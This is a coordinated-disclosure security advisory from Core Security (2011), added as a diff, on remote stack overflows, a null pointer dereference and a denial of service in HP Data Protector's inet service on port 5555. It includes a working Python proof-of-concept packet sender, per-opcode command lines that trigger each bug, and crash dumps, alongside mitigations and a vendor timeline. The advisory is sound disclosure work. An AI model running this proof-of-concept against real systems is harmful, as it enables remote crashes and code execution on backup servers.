@@ -1,0 +1,325 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+  Core Security Technologies - Corelabs Advisory
+       http://corelabs.coresecurity.com/
+
+  Multiple vulnerabilities in HP Data Protector
+
+
+1. *Advisory Information*
+
+Title: Multiple vulnerabilities in HP Data Protector
+Advisory ID: CORE-2011-0514
+Advisory URL:
+http://www.coresecurity.com/content/HP-Data-Protector-multiple-vulnerabilities
+Date published: 2011-06-29
+Date of last update: 2011-06-29
+Vendors contacted: HP
+Release mode: Coordinated release
+
+
+2. *Vulnerability Information*
+
+Class: Remote stack overflow [CWE-120], Null pointer dereference
+[CWE-476], Improper input validation [CWE-20]
+Impact: Code execution
+Remotely Exploitable: Yes
+Locally Exploitable: No
+CVE Name: CVE-2011-1865, CVE-2011-1514, CVE-2011-1515
+
+
+3. *Vulnerability Description*
+
+HP Data Protector [1] is an automated backup and recovery software for
+single-server to enterprise environments. Multiple vulnerabilities have
+been found in HP Data Protector that could allow a remote attacker to
+execute arbitrary code and lead to denial of service conditions. The
+vulnerabilities are triggered by sending a request to port 5555 of a
+host running the "data protector inet" service, part of HP Data
+Protector. The request has several parameters, including an opcode. By
+sending requests with specially crafted parameters, the different bugs
+can be triggered.
+
+
+4. *Vulnerable packages*
+
+   . HP OpenView Storage Data Protector v6.20 (running on Windows).
+   . HP OpenView Storage Data Protector v6.11 (running on Windows).
+   . HP OpenView Storage Data Protector v6.10 (running on Windows).
+   . HP OpenView Storage Data Protector v6.00 (running on Windows).
+   . Previous versions may be affected, but were not tested.
+
+
+5. *Non-vulnerable packages*
+
+   . No fixes are available at the time of publication.
+
+
+6. *Vendor Information, Solutions and Workarounds*
+
+HP has issued a security bulletin with document ID c02872182 [2]
+available through HP Support Center at http://www.hp.com/go/HPSC.
+
+The latest version of HP Data Protector is vulnerable to these issues.
+HP has provided the following procedure to mitigate these vulnerabilities:
+
+   1. Upgrade to Data Protector A.06.20 or subsequent.
+   2. Enable encrypted control communication services on cell server and
+all clients in cell.
+
+ The upgrade is available for download from
+http://hp.com/go/dataprotector then under 'Product Information' click on
+'Trials and Demos'.
+
+
+7. *Credits*
+
+These vulnerabilities were discovered by Oren Isacson from Core Security
+Technologies. Publication was coordinated by Carlos Sarraute.
+
+
+8. *Technical Description / Proof of Concept Code*
+
+The following python script can be used to reproduce the different bugs.
+
+/-----
+import struct, socket, sys
+
+target        = sys.argv[1]
+opcode        = sys.argv[2]
+string_lenght = int(sys.argv[3])
+args_number   = int(sys.argv[4])
+long_argument = int(sys.argv[5])
+
+def to_wc(x):
+    return ''.join(["%s\x00" % c for c in x] )
+
+args = [to_wc('a')] * args_number
+args[5] = to_wc(opcode)
+args[long_argument] = 'a' * string_lenght
+packet = ["\xff\xfe\x32\x00\x00\x00"]
+
+for s in args:
+    packet.append("\x20\x00" + s + "\x00\x00")
+
+packet = ''.join(packet)
+packet = struct.pack(">L", len(packet)) + packet
+
+sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+sock.connect((target, 5555))
+sock.send(packet)
+
+- -----/
+
+
+In the following sections, we give the command line details to reproduce
+each bug, and a brief description of the effect produced.
+
+
+8.1. *Vulnerability 1. Opcodes 20 y 28.*
+
+[CVE-2011-1865] This vulnerability can be reproduced with any of the
+following commands:
+ "poc.py 127.0.0.1 20 10000 30 13" or "poc.py 127.0.0.1 28 10000 30 6"
+ This causes a stack overflow.
+
+/-----
+007ce194 00426c52 007d0000 00810b48 007ce266 omniinet+0x26bf3
+007ce1a8 00412a35 007ce22c 004aa900 0080edb0 omniinet+0x26c52
+007cea3c 61616161 61616161 61616161 61616161 omniinet+0x12a35
+61616161 00000000 00000000 00000000 00000000 0x61616161
+
+- -----/
+
+
+
+8.2. *Vulnerability 2. Opcode 11.*
+
+[CVE-2011-1865] This vulnerability is reproduced with the following command:
+ "poc.py 127.0.0.1 11 10000 30 17"
+ A stack overflow is produced within the function swprintf, called from
+position 0x00411A72.
+
+
+8.3. *Vulnerability 3. Opcode 35.*
+
+[CVE-2011-1865] This vulnerability can be reproduced with any of the
+following commands:
+ "poc.py 127.0.0.1 35 10000 30 6" or "poc.py 127.0.0.1 35 10000 30 7"
+ A stack overflow is produced within the function swprintf, called from
+position 0041367F.
+
+
+8.4. *Vulnerability 4. Opcode 42.*
+
+[CVE-2011-1865] This vulnerability is reproduced with the following command:
+ "poc.py 127.0.0.1 42 10000 30 9"
+ A stack overflow is produced by calling the function swprintf from
+position 0x0040A9BA.
+
+
+8.5. *Vulnerability 5. Opcode 46.*
+
+[CVE-2011-1865] This vulnerability is reproduced with the following command:
+ "poc.py 127.0.0.1 46 10000 30 17"
+ A stack overflow is produced by calling the function swprintf from
+position 0x0040A708.
+
+
+8.6. *Vulnerability 6. Opcode 27.*
+
+[CVE-2011-1865] This vulnerability is reproduced with the following command:
+ "poc.py 127.0.0.1 27 10000 30 3"
+ A stack overflow is produced by calling the function swprintf from
+position 0x0040AD53.
+
+
+8.7. *Vulnerabilidad 7. Opcode 17.*
+
+[CVE-2011-1865] This vulnerability is reproduced with the following command:
+ "poc.py 127.0.0.1 17 10000 30 6"
+ A stack overflow is produced by calling the function swprintf from
+position 0x0040FC05.
+
+
+8.8. *Vulnerability 8. Opcode 11.*
+
+[CVE-2011-1514] This vulnerability is reproduced with the following command:
+ "poc.py 127.0.0.1 11 1 7 6"
+ This causes a null pointer dereference.
+
+/-----
+eax=00000014 ebx=00156490 ecx=007cdd34 edx=007eecf0 esi=00156490
+edi=00000000
+eip=00407ed0 esp=007cdd34 ebp=007cdd8c iopl=0         nv up ei pl nz ac
+pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000
+efl=00010212
+omniinet+0x7ed0:
+00407ed0 8b10             mov     edx,[eax]
+ds:0023:00000014=????????
+
+
+007cdd8c 0041143e 00000000 00000000 00156490 omniinet+0x7ed0
+007cea3c 0040892b 00000001 0046b9f0 00000000 omniinet+0x1143e
+007cf4b8 00408f02 00000000 00000000 00156490 omniinet+0x892b
+007cf518 0040a42c 00000000 7ad5f7f9 00000000 omniinet+0x8f02
+007cffa0 77df352b 00000001 00156498 0012e7f8 omniinet+0xa42c
+007cffb4 7c80b713 00156490 00000000 0012e7f8
+ADVAPI32!CryptVerifySignatureW+0x29
+007cffec 00000000 77df3519 00156490 00000000
+kernel32!GetModuleFileNameA+0x1b4
+
+- -----/
+
+
+8.9. *Vulnerability 9. Opcode 20.*
+
+[CVE-2011-1515] This vulnerability is reproduced with the following command:
+ "poc.py 127.0.0.1 20 1 7 6"
+ The process terminates without generating an exception, resulting in a
+denial of service condition.
+
+
+9. *Report Timeline*
+
+. 2011-06-02:
+Core Security Technologies notifies HP Security Alert team of the
+vulnerabilities. Publication date is temporarily set to July 5th, 2011.
+
+. 2011-06-06:
+Vendor acknowledges receipt.
+
+. 2011-06-06:
+Core sends technical details to the vendor.
+
+. 2011-06-06:
+Vendor confirms that a new case was assigned within HP Software Security
+Response Team (SSRT).
+
+. 2011-06-16:
+Core requests an update on this issue, in particular Core asks the
+vendor for a technical analysis of the bugs, a list of affected products
+and versions, and the vendor's plan for providing a fix (no reply
+received).
+
+. 2011-06-23:
+Core requests once more an update.
+
+. 2011-06-28:
+Vendor communicates that a security bulletin will be issued on the same
+day (June 28). The vendor confirms the vulnerabilities, and recommends
+as mitigation to enable encrypted communications in the cell server and
+client.
+
+. 2011-06-28:
+Core requests a link to the vendor's bulletin, and asks whether CVE ids
+have been assigned.
+
+. 2011-06-28:
+Vendor provides a link to the bulletin and CVE names for the
+vulnerabilities.
+
+. 2011-06-29:
+Advisory CORE-2011-0514 is published.
+
+
+10. *References*
+
+[1] HP Data Protector http://hp.com/go/dataprotector
+[2] HPSBMU02686 SSRT100541 rev.2 - HP OpenView Storage Data Protector,
+Remote Execution of Arbitrary Code
+http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02872182
+
+
+11. *About CoreLabs*
+
+CoreLabs, the research center of Core Security Technologies, is charged
+with anticipating the future needs and requirements for information
+security technologies. We conduct our research in several important
+areas of computer security including system vulnerabilities, cyber
+attack planning and simulation, source code auditing, and cryptography.
+Our results include problem formalization, identification of
+vulnerabilities, novel solutions and prototypes for new technologies.
+CoreLabs regularly publishes security advisories, technical papers,
+project information and shared software tools for public use at:
+http://corelabs.coresecurity.com.
+
+
+12. *About Core Security Technologies*
+
+Core Security Technologies enables organizations to get ahead of threats
+with security test and measurement solutions that continuously identify
+and demonstrate real-world exposures to their most critical assets. Our
+customers can gain real visibility into their security standing, real
+validation of their security controls, and real metrics to more
+effectively secure their organizations.
+
+Core Security's software solutions build on over a decade of trusted
+research and leading-edge threat expertise from the company's Security
+Consulting Services, CoreLabs and Engineering groups. Core Security
+Technologies can be reached at +1 (617) 399-6980 or on the Web at:
+http://www.coresecurity.com.
+
+
+13. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2011 Core Security
+Technologies and (c) 2011 CoreLabs, and are licensed under a Creative
+Commons Attribution Non-Commercial Share-Alike 3.0 (United States)
+License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+
+
+14. *PGP/GPG Keys*
+
+This advisory has been signed with the GPG key of Core Security
+Technologies advisories team, which is available for download at
+http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.9 (MingW32)
+
+iEUEARECAAYFAk4LmqsACgkQyNibggitWa02bgCYyTgE3BmdxGGAOY4dNZqmekvo
+CwCfTapBtDaQT/LBrrVC7K4l8G5hnEo=
+=ozGY
+-----END PGP SIGNATURE-----
